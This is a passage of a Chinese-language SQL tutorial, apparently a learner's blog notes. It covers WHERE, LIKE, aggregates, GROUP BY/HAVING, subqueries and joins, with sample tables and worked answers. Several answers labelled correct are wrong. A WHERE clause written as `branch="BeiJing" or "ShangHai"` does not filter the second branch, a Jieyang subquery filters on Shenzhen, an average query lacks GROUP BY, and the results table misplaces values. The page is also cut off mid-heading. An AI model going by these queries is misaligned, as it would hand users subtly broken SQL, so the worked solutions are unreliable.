class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">更新表中行里的数据</span><br><span class="line">语法：update 表名 set 列名&#x3D;要更新的值 where 更新谁的</span><br><span class="line"></span><br><span class="line">update stuinfo set department&#x3D;&#39;QA&#39; where name&#x3D;&#39;Tim&#39;;</span><br><span class="line"></span><br><span class="line">要写条件，更新谁的，不写会默认更新整一个列的值</span><br><span class="line"></span><br><span class="line">要是报错 safe update mode的话要在edit-Preferences-SQL Editor-Safe updates选项关掉</span><br><span class="line">然后在 Query-Reconnect to sever</span><br></pre></td></tr></table></figure><h3 id="修改操作"><a href="#修改操作" class="headerlink" title="修改操作"></a>修改操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除 name为lucy的行</span><br><span class="line">delete from stuinfo where name&#x3D;&quot;lucy&quot;</span><br></pre></td></tr></table></figure><h2 id="SQL逻辑操作符提取数据"><a href="#SQL逻辑操作符提取数据" class="headerlink" title="SQL逻辑操作符提取数据"></a>SQL逻辑操作符提取数据</h2><h3 id="查询语句中的Select-Distinct-关键字的用法"><a href="#查询语句中的Select-Distinct-关键字的用法" class="headerlink" title="查询语句中的Select Distinct 关键字的用法"></a>查询语句中的Select Distinct 关键字的用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">取列name中唯一的值，去掉重复的姓名</span><br><span class="line"></span><br><span class="line">select distinct name from stuinfo;</span><br></pre></td></tr></table></figure><h3 id="SQL-Where命令的使用"><a href="#SQL-Where命令的使用" class="headerlink" title="SQL Where命令的使用"></a>SQL Where命令的使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">只取 location为Shenzhen的人</span><br><span class="line">select name from stuinfo where location&#x3D;&quot;Shenzhen&quot;;</span><br></pre></td></tr></table></figure><h3 id="SQL语句中逻辑运算符and-和-or的用法"><a href="#SQL语句中逻辑运算符and-和-or的用法" class="headerlink" title="SQL语句中逻辑运算符and 和 or的用法"></a>SQL语句中逻辑运算符and 和 or的用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">取location是Shenzhen，年龄大于20的学生</span><br><span class="line">select name from stuinfo where location&#x3D;&quot;Shenzhen&quot;and age&gt;20;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">取来自深圳的学生，年龄小于25，或者来自北京的学生</span><br><span class="line">select name from stuinfo where (location&#x3D;&quot;Shenzhen&quot; and age&lt;25) or location&#x3D;&quot;Beijing&quot;;</span><br></pre></td></tr></table></figure><h3 id="逻辑运算符-‘In’-‘Between’用法"><a href="#逻辑运算符-‘In’-‘Between’用法" class="headerlink" title="逻辑运算符 ‘In’ ‘Between’用法"></a>逻辑运算符 ‘In’ ‘Between’用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">年龄在 23-25之间的学生的名字</span><br><span class="line">select name from stuinfo where age in(23,24,25);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">选取id在 1-1000之间的</span><br><span class="line">select name from stuinfo where id between 1 and 1000</span><br><span class="line"></span><br><span class="line">选取所以年龄小于25的学生姓名</span><br><span class="line"># age&lt;25</span><br><span class="line"># in(1,2,3,...25)</span><br><span class="line"># between 0 and 25</span><br><span class="line"># not between 25 and 1000</span><br><span class="line"></span><br><span class="line">选取id不在25,100之间</span><br><span class="line">select name from stuinfo where id not between 25 and 100</span><br></pre></td></tr></table></figure><h2 id="写Smart-SQL-Queries的正则表达式"><a href="#写Smart-SQL-Queries的正则表达式" class="headerlink" title="写Smart SQL Queries的正则表达式"></a>写Smart SQL Queries的正则表达式</h2><h3 id="正则表达式介绍"><a href="#正则表达式介绍" class="headerlink" title="正则表达式介绍"></a>正则表达式介绍</h3><p>主要介绍两个 符号 % 和 _</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">例如： 字母 abcd</span><br><span class="line">% 匹配任意多个字母</span><br><span class="line">_ 匹配单个字母</span><br><span class="line"></span><br><span class="line">a%  _b%(第一个字母不清楚，第二个字母为b，后边的不知道)  __c%</span><br><span class="line"></span><br><span class="line">取一个有3个字母的名字第一个字母是d</span><br><span class="line">d__</span><br><span class="line"></span><br><span class="line">取以a开头的学生的名字</span><br><span class="line">a%</span><br></pre></td></tr></table></figure><h3 id="查询中的通配符用法"><a href="#查询中的通配符用法" class="headerlink" title="查询中的通配符用法"></a>查询中的通配符用法</h3><p>选出以A开头的CountryCode的name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法： select 列 from 表 where 列 like &#39;正则表达式&#39;</span><br><span class="line">select name from city where CountryCode like&#39;A%&#39;;</span><br></pre></td></tr></table></figure><p>选出CountryCode第三个字符是D的countrycode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select CountryCode from city where CountryCode like&#39;__D%&#39;;</span><br></pre></td></tr></table></figure><h3 id="查询语句中-sort-by用法"><a href="#查询语句中-sort-by用法" class="headerlink" title="查询语句中 sort by用法"></a>查询语句中 sort by用法</h3><p>以 id排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from stuinfo order by id;  # 默认是升序</span><br><span class="line"></span><br><span class="line">select * from stuinfo order by id desc;  # 加desc改为降序排序</span><br></pre></td></tr></table></figure><h2 id="高级的SQL概念-Part1"><a href="#高级的SQL概念-Part1" class="headerlink" title="高级的SQL概念-Part1"></a>高级的SQL概念-Part1</h2><h3 id="SQL函数"><a href="#SQL函数" class="headerlink" title="SQL函数"></a>SQL函数</h3><p>SQL拥有很多可用于计数和计算的内建函数</p><p><strong>函数的语法</strong><br>内建SQL函数的语法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT function(列) FROM 表</span><br></pre></td></tr></table></figure><p><strong>函数的类型</strong><br>函数的基本类型是：</p><ul><li>Aggregate</li><li>Scalar</li></ul><p><strong>合计函数(Aggregate functions)</strong><br>Aggregate 函数的操作面向一系列的值，并返回一个单一的值。<br>注释：如果在 SELECT 语句的项目列表中的众多其它表达式中使用 SELECT 语句，则这个 SELECT 必须使用 GROUP BY 语句!</p><p><strong>在SQL Server中的合计函数</strong></p><table><thead><tr><th align="center">Name</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">AVG(column)</td><td align="center">返回某列的平均值</td></tr><tr><td align="center">BINARY_CHECKSUM</td><td align="center"></td></tr><tr><td align="center">CHECKSUM</td><td align="center"></td></tr><tr><td align="center">CHECKSUM_AGG</td><td align="center"></td></tr><tr><td align="center">COUNT(column)</td><td align="center">返回某列的行数(不包括NULL值)</td></tr><tr><td align="center">COUNT(*)</td><td align="center">返回被选行数</td></tr><tr><td align="center">COUNT(DISTINCT column)</td><td align="center">返回相异的结果的数目</td></tr><tr><td align="center">FIRST(column)</td><td align="center">返回在指定的域中第一个记录的值（SQLServer2000 不支持）</td></tr><tr><td align="center">LAST(column)</td><td align="center">返回在指定的域中最后一个记录的值（SQLServer2000 不支持）</td></tr><tr><td align="center">MAX(column)</td><td align="center">返回某列的最高值</td></tr><tr><td align="center">MIN(column)</td><td align="center">返回某列的最低值</td></tr><tr><td align="center">STDEV(column)</td><td align="center"></td></tr><tr><td align="center">STDEVP(column)</td><td align="center"></td></tr><tr><td align="center">SUM(column)</td><td align="center">返回某列的总和</td></tr><tr><td align="center">VAR(column)</td><td align="center"></td></tr><tr><td align="center">VARP(column)</td><td align="center"></td></tr></tbody></table><p><strong>Scalar函数</strong><br>Scalar 函数的操作面向某个单一的值，并返回基于输入值的一个单一的值。</p><p><strong>MS Access 中的 Scalar 函数</strong></p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">UCASE(c)</td><td align="center">将某个域转换为大写</td></tr><tr><td align="center">LCASE(c)</td><td align="center">将某个域转换为小写</td></tr><tr><td align="center">MID(c,start[,end])</td><td align="center">从某个文本域提取字符</td></tr><tr><td align="center">LEN(c)</td><td align="center">返回某个文本域的长度</td></tr><tr><td align="center">INSTR(c,char)</td><td align="center">返回在某个文本域中指定字符的数值位置</td></tr><tr><td align="center">LEFT(c,number_of_char)</td><td align="center">返回某个被请求的文本域的左侧部分</td></tr><tr><td align="center">RIGHT(c,number_of_char)</td><td align="center">返回某个被请求的文本域的右侧部分</td></tr><tr><td align="center">ROUND(c,decimals)</td><td align="center">对某个数值域进行指定小数位数的四舍五入</td></tr><tr><td align="center">MOD(x,y)</td><td align="center">返回除法操作的余数</td></tr><tr><td align="center">NOW()</td><td align="center">返回当前的系统日期</td></tr><tr><td align="center">FORMAT(c,format)</td><td align="center">改变某个域的显示方式</td></tr><tr><td align="center">DATEDIFF(d,date1,date2)</td><td align="center">用于执行日期计算</td></tr></tbody></table><h3 id="用真实场景介绍SQL函数-count"><a href="#用真实场景介绍SQL函数-count" class="headerlink" title="用真实场景介绍SQL函数-count"></a>用真实场景介绍SQL函数-count</h3><p>有一个表 Company</p><table><thead><tr><th align="center">Name</th><th align="center">Branch</th><th align="center">Employees</th></tr></thead><tbody><tr><td align="center">HUAWEI</td><td align="center">US</td><td align="center">300</td></tr><tr><td align="center">Google</td><td align="center">US</td><td align="center">500</td></tr><tr><td align="center">Yahoo</td><td align="center">Canada</td><td align="center">250</td></tr><tr><td align="center">Google</td><td align="center">China</td><td align="center">450</td></tr><tr><td align="center">HUAWEI</td><td align="center">China</td><td align="center">700</td></tr><tr><td align="center">HUAWEI</td><td align="center">US</td><td align="center">300</td></tr><tr><td align="center">HUAWEI</td><td align="center">Canada</td><td align="center">200</td></tr><tr><td align="center">Facebook</td><td align="center">US</td><td align="center">600</td></tr></tbody></table><table><thead><tr><th align="center">写出以下查询的SQL语句</th><th align="center">数据库测试</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">全球Branch个数</td><td align="center">pass</td><td align="center">8</td></tr><tr><td align="center">哪个分支拥有最大员工数</td><td align="center">pass</td><td align="center">700</td></tr><tr><td align="center">每个分支平均员工数</td><td align="center">412.5</td><td align="center">pass</td></tr><tr><td align="center">哪个分支有最小的员工数</td><td align="center">pass</td><td align="center">200</td></tr><tr><td align="center">全球员工数之和</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">每一个地理位置的员工数求和</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">每一个公司的员工数求和</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">在Canada和在China branch的员工数的和</td><td align="center"></td><td align="center"></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">全球Branch个数:</span><br><span class="line">select COUNT(Branch) from Company;  # 注意不包括NULL值</span><br><span class="line"></span><br><span class="line">哪个分支拥有最大员工数:</span><br><span class="line">select branch,max(Employees) from Company group by branch; # 哪个分支，所以要把分支也select出来。因为其默认值取出一条记录，预防有两个员工数量一样为最大值的分支，要将两个同时取出来的情况，所以要将branch 进行group by分个组</span><br><span class="line"></span><br><span class="line">每个分支平均员工数:</span><br><span class="line">select branch,avg(Employees) from Company;</span><br><span class="line"></span><br><span class="line">哪个分支有最小的员工数：</span><br><span class="line">select branch,min(Employees) from Company group by branch;</span><br><span class="line"></span><br><span class="line">全球员工数之和：</span><br><span class="line">select sum(Employees) from Company;</span><br><span class="line"></span><br><span class="line">每一个地理位置的员工数求和:</span><br><span class="line">select sum(Employees) from Company where Branch; # 是错误的</span><br><span class="line">正确的是：</span><br><span class="line">select branch,sum(Employees) from Company group by branch;</span><br><span class="line"># group by 分组，将branch进行分组，合并，一样的合为一组</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">每一个公司的员工数求和:</span><br><span class="line">select name,SUM(Employees) from Company where Name;#错</span><br><span class="line">正确答案：</span><br><span class="line">select name,sum(Employees) from Company group by name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在Canada和在China branch的员工数的和:</span><br><span class="line">select SUM(Employees) from Company where Branch betwwen Canada and China;  # 错</span><br><span class="line">正确答案：</span><br><span class="line">select branch,sum(Employees) from Company group by branch having branch&#x3D;&quot;Canada&quot; or branch&#x3D;&quot;China&quot;</span><br><span class="line"></span><br><span class="line">注意：having 与 where用处很像，但having是用在group by分组后还要添加条件的时候，与group by 结合使用，没有group by分组的时候要添加条件 用where colum_name 运算符 &quot;value&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="SQL函数-Max-amp-Min-amp-AVG"><a href="#SQL函数-Max-amp-Min-amp-AVG" class="headerlink" title="SQL函数-Max&amp;Min&amp;AVG"></a>SQL函数-Max&amp;Min&amp;AVG</h3><p><strong>MAX()函数、MIN() 函数</strong></p><ul><li>MAX 函数返回一列中的最大值。NULL 值不包括在计算中。</li><li>MIN 函数返回一列中的最小值。NULL 值不包括在计算中。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MAX()函数</span><br><span class="line">语法：SELECT MAX(column_name) FROM table_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找表stuinfo中ID最大的值</span><br><span class="line">SELECT MAX(id) AS LargestId FROM stuinfo</span><br><span class="line"></span><br><span class="line"># 会返回一个列名为 LargestID的一个列</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>MIN 和 MAX 也可用于文本列，以获得按字母顺序排列的最高或最低值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MIN() 函数</span><br><span class="line">语法:</span><br><span class="line">SELECT MIN(column_name) FROM table_name</span><br><span class="line"></span><br><span class="line">查找表stuinfo中ID最小的值</span><br><span class="line">SELECT MIN(OrderPrice) AS SmallestOrderPrice FROM Orders</span><br></pre></td></tr></table></figure><h3 id="SQL中Group-By的重要性"><a href="#SQL中Group-By的重要性" class="headerlink" title="SQL中Group By的重要性"></a>SQL中Group By的重要性</h3><p>GROUP BY 语句用于结合合计函数，根据一个或多个列对结果集进行分组</p><p><strong>SQL GROUP BY语法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name, aggregate_function(column_name)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br><span class="line">GROUP BY column_name</span><br></pre></td></tr></table></figure><h3 id="GroupBy和SQL函数SUM组合使用"><a href="#GroupBy和SQL函数SUM组合使用" class="headerlink" title="GroupBy和SQL函数SUM组合使用"></a>GroupBy和SQL函数SUM组合使用</h3><p>在真实场景介绍SQL函数-count中</p><h3 id="Group-By实例演示及-having用法"><a href="#Group-By实例演示及-having用法" class="headerlink" title="Group By实例演示及 having用法"></a>Group By实例演示及 having用法</h3><p>在真实场景介绍SQL函数-count中</p><h2 id="加深对GroupBy，聚合函数的理解–实例演示"><a href="#加深对GroupBy，聚合函数的理解–实例演示" class="headerlink" title="加深对GroupBy，聚合函数的理解–实例演示"></a>加深对GroupBy，聚合函数的理解–实例演示</h2><p>只有group by分组，没有聚合函数是没有意义的，其只会显示原本第一条的记录</p><h3 id="SQL-中groupby的重要性-Groupby-amp-sum"><a href="#SQL-中groupby的重要性-Groupby-amp-sum" class="headerlink" title="SQL 中groupby的重要性-Groupby&amp;sum"></a>SQL 中groupby的重要性-Groupby&amp;sum</h3><p><strong>表Transactions</strong></p><table><thead><tr><th align="center">Month</th><th align="center">Day</th><th align="center">Amount</th><th align="center">Branch</th></tr></thead><tbody><tr><td align="center">Feb</td><td align="center">13</td><td align="center">125</td><td align="center">Beijing</td></tr><tr><td align="center">Feb</td><td align="center">17</td><td align="center">20800</td><td align="center">ShangHai</td></tr><tr><td align="center">Feb</td><td align="center">21</td><td align="center">380</td><td align="center">NewYork</td></tr><tr><td align="center">Mar</td><td align="center">22</td><td align="center">8800</td><td align="center">Beijing</td></tr><tr><td align="center">Mar</td><td align="center">16</td><td align="center">5200</td><td align="center">ShaiHai</td></tr><tr><td align="center">Aprill</td><td align="center">23</td><td align="center">300</td><td align="center">NewYork</td></tr><tr><td align="center">Jan</td><td align="center">13</td><td align="center">888</td><td align="center">Beijing</td></tr><tr><td align="center">May</td><td align="center">2</td><td align="center">3600</td><td align="center">NewYork</td></tr><tr><td align="center">May</td><td align="center">1</td><td align="center">77777</td><td align="center">Paris</td></tr><tr><td align="center">Jan</td><td align="center">12</td><td align="center">6000</td><td align="center">Paris</td></tr></tbody></table><p>要求：<br>1.获取每个月产生的总金额<br>2.获取每个月产生的最大交易金额<br>3.获取每个月产生的最小交易金额<br>4.获取每个月产生的平均交易金额<br>5.获取每个月少于两次的交易<br>6.获取只在北京和上海分支每月产生的总金额<br>7.把纽约和巴黎的分支机构合并时，得到总销售额低于1000的月份<br>8.哪一个分支在2月份的交易总额超过4000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">1.获取每个月产生的总金额</span><br><span class="line">select month,sum(Amount) from Transactions group by month;</span><br><span class="line"> # 以月份来分组，分为Feb，Mar，Aprill，Jan， May 五个组，其他列的记录默认选择其分组的第一个记录</span><br><span class="line">tips： 如果不将month进行分组，select month,sum(Amount) from Transactions 显示的是所有月的总金额，month默认选择第一条的记录</span><br><span class="line"></span><br><span class="line">2.获取每个月产生的最大交易金额</span><br><span class="line">select month,max(Amount) from transactions group by month;</span><br><span class="line"></span><br><span class="line">3.获取每个月产生的最小交易金额</span><br><span class="line">select month,min(Amount) from transactions group by month;</span><br><span class="line"></span><br><span class="line">4.获取每个月产生的平均交易金额</span><br><span class="line">select month,avg(Amount) from transactions group by month;</span><br><span class="line"></span><br><span class="line">5.获取每个月少于两次的交易</span><br><span class="line">select count(*),month from transactions group by month having count(*)&lt;2；</span><br><span class="line"># 语句返回了分组后每一个组中有几条记录。</span><br><span class="line"># count(*)返回被选行数，如果不用group by ，其作用在整个表上，即返回整个表的行数，用了group by其作用在每一个组上，返回每一个组由多少行组成</span><br><span class="line"># having 对分组后的结果的基础上加条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.获取只在北京和上海分支每月产生的总金额</span><br><span class="line">select month,sum(Amount) from transactions group by month having branch in(&quot;Beijing&quot;,&quot;ShangHai&quot;) </span><br><span class="line"># 错，having只能在分组的结果上添加条件，在这只能对 sum(Amount)或month添加条件</span><br><span class="line"></span><br><span class="line">思路： 先取得每个月产生的总金额，select month,sum(Amount) from transactions group by month，其次要在分组之前排除不在北京和上海的记录</span><br><span class="line">正确：</span><br><span class="line">select month,sum(Amount) from transactions where branch&#x3D;&quot;BeiJing&quot; or &quot;ShangHai&quot; group by month;</span><br><span class="line"></span><br><span class="line"># 题6运用了 group by和where</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">外加：取北京或上海的分支中，每个月总销售额低于1000的数据</span><br><span class="line">select month,sum(Amount) from transactions where branch&#x3D;&quot;BeiJing&quot; or &quot;ShangHai&quot; group by month having sum(Amount)&lt;1000; # 在题6的基础上加上 having条件限制</span><br><span class="line"></span><br><span class="line">外加题是运用 groupby having 和where 的经典例子</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.在北京或上海的分支中，每月总销售额大于1000的月份</span><br><span class="line">select sum(Amount),month from transactions where branch&#x3D;&quot;BeiJing&quot; or branch&#x3D;&quot;ShangHai&quot; group by month having sum(amount)&gt;1000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.哪一个分支在2月份的交易总额超过4000</span><br><span class="line">select branch,sum(Amount) from transactions group by branch having Month&#x3D;&quot;Feb&quot;;# 错的</span><br><span class="line"></span><br><span class="line">正确答案：以分支分组，排除组中不是2月的记录，在分组，设条件</span><br><span class="line">select branch,sum(amount) from transactions where month&#x3D;&quot;Feb&quot; group by branch having sum(amount)&gt;4000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实例演示-SQL-Sub-queries-子查询"><a href="#实例演示-SQL-Sub-queries-子查询" class="headerlink" title="实例演示 SQL Sub queries(子查询)"></a>实例演示 SQL Sub queries(子查询)</h2><h3 id="Subquery语法和使用"><a href="#Subquery语法和使用" class="headerlink" title="Subquery语法和使用"></a>Subquery语法和使用</h3><h3 id="Subquery实例演示"><a href="#Subquery实例演示" class="headerlink" title="Subquery实例演示"></a>Subquery实例演示</h3><p>表一：employee_loc</p><table><thead><tr><th align="center">name</th><th align="center">location</th></tr></thead><tbody><tr><td align="center">czx</td><td align="center">jieyang</td></tr><tr><td align="center">lqs</td><td align="center">shenzhen</td></tr><tr><td align="center">cym</td><td align="center">jieyang</td></tr><tr><td align="center">lmf</td><td align="center">jiangmen</td></tr></tbody></table><p>表二：employees</p><table><thead><tr><th align="center">name</th><th align="center">age</th><th align="center">exp</th></tr></thead><tbody><tr><td align="center">czx</td><td align="center">21</td><td align="center">2</td></tr><tr><td align="center">lqs</td><td align="center">21</td><td align="center">2</td></tr><tr><td align="center">cym</td><td align="center">22</td><td align="center">5</td></tr><tr><td align="center">lmf</td><td align="center">25</td><td align="center">3</td></tr></tbody></table><p>要求：<br>1.位于深圳这个人的姓名和年龄<br>2.位于潮汕的人的姓名和年龄<br>3.位于江门的这个人的姓名和工作年限<br>4.年龄是22岁这个人的姓名和location</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">要求1：位于深圳这个人的姓名和年龄</span><br><span class="line"></span><br><span class="line">找到两个表中共同拥有的colum_name，作为where的条件定位</span><br><span class="line"></span><br><span class="line">主查询：select name,age from employees where name&#x3D;(子查询);</span><br><span class="line"></span><br><span class="line">子查询： select name from employee_loc where location&#x3D;&quot;shenzhen&quot;;   # 找到在深圳的人name</span><br><span class="line"></span><br><span class="line">即：</span><br><span class="line">select name,age from employees where name&#x3D;(select name from employee_loc where location&#x3D;&quot;shenzhen&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要求2：位于揭阳的人的姓名和年龄</span><br><span class="line">看一看到位于揭阳的有两个人，要是还按要求一那般则会报错，当返回的值不是单个确定的时候就不能用&#x3D;号了，不值一个值要用in操作符</span><br><span class="line"></span><br><span class="line">select name,age from employees where name in(select name from employee_loc where location&#x3D;&quot;shenzhen&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要求3：位于江门的这个人的姓名和工作年限(两表共同属性name)</span><br><span class="line"></span><br><span class="line">select name,exp from employees where name&#x3D;(select name from employee_loc where location&#x3D;&quot;jiangmen&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">要求4：年龄是22岁这个人的姓名和location</span><br><span class="line">主查询： select name,location from emloyee_loc where name&#x3D;(子查询);</span><br><span class="line"></span><br><span class="line">子查询：select name from emloyees where age&#x3D;22;</span><br><span class="line"></span><br><span class="line">故：</span><br><span class="line">select name,location from emloyee_loc where name&#x3D;(select name from emloyees where age&#x3D;22);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SQL-Joins，Inner-JoIn，Outer-JoIns，Left-amp-Right-JoIns及面试问题"><a href="#SQL-Joins，Inner-JoIn，Outer-JoIns，Left-amp-Right-JoIns及面试问题" class="headerlink" title="SQL Joins，Inner JoIn，Outer JoIns，Left&amp;Right JoIns及面试问题"></a>SQL Joins，Inner JoIn，Outer JoIns，Left&amp;Right JoIns及面试问题</h2><h3 id="SQL-join的用法和优势"><a href="#SQL-join的用法和优势" class="headerlink" title="SQL join的用法和优势"></a>SQL join的用法和优势</h3><p>将两张表join成一张表，通过通用字段name，将两张表join成一张表，然后在join后的表中执行Quary就不用利用subquary写两条quary，简便很多。具体看 joins实例演示</p><h3 id="SQL-joins实例演示"><a href="#SQL-joins实例演示" class="headerlink" title="SQL joins实例演示"></a>SQL joins实例演示</h3><p>表一：employee_loc 别名 el</p><table><thead><tr><th align="center">name</th><th align="center">location</th></tr></thead><tbody><tr><td align="center">czx</td><td align="center">jieyang</td></tr><tr><td align="center">lqs</td><td align="center">shenzhen</td></tr><tr><td align="center">cym</td><td align="center">jieyang</td></tr><tr><td align="center">lmf</td><td align="center">jiangmen</td></tr></tbody></table><p>表二：employees 别名 e</p><table><thead><tr><th align="center">name</th><th align="center">age</th><th align="center">exp</th></tr></thead><tbody><tr><td align="center">czx</td><td align="center">21</td><td align="center">2</td></tr><tr><td align="center">lqs</td><td align="center">21</td><td align="center">2</td></tr><tr><td align="center">cym</td><td align="center">22</td><td align="center">5</td></tr><tr><td align="center">lmf</td><td align="center">25</td><td align="center">3</td></tr></tbody></table><p>要求： 首先将两个表通过共同的colum_name进行join连接<br>1.位于揭阳的这个人的姓名和年龄<br>2.位于深圳的这个人的姓名和工作年限<br>3.年龄是22岁这个人的姓名和location</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对两表进行连接：</span><br><span class="line">select e.name,el.location,e.age from employees as e join employee_loc as el on e.name&#x3D;el.name where el.location&#x3D;&quot;jieyang&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Subqueries和joins的关系"><a href="#Subqueries和joins的关系" class="headerlink" title="Subqueries和joins的关系"></a>Subqueries和joins的关系</h3><h3 id="MySQL-Error-Code-1055J解决办法-Group-By"><a href="#MySQL-Error-Code-1055J解决办法-Group-By" class="headerlink" title="MySQL Error Code 1055J解决办法-Group By"></a>MySQL Error Code 1055J解决办法-Group By</h3><h3 id="join和subquery的实例演示"><a 